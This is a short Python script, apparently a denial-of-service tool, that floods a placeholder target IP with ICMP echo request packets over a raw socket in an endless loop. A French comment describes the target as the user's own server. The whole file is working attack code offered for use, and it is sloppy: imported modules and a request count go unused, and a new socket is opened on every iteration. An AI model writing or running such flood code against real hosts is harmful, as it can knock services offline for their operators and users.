import socket
import threading
import time

target_ip = "XXXXXX"  # Remplacez par l'IP réelle de votre serveur
num_requests = 100

def icmp_flood():
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        client.sendto(b'\x08\x00\x7d\x4b\x00\x01\x00\x01', (target_ip, 1))  # Paquet ICMP Echo Request
    except Exception as e:
        print(f"Error: {e}")

def main():
    while True:
        icmp_flood()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Script arrêté manuellement.")
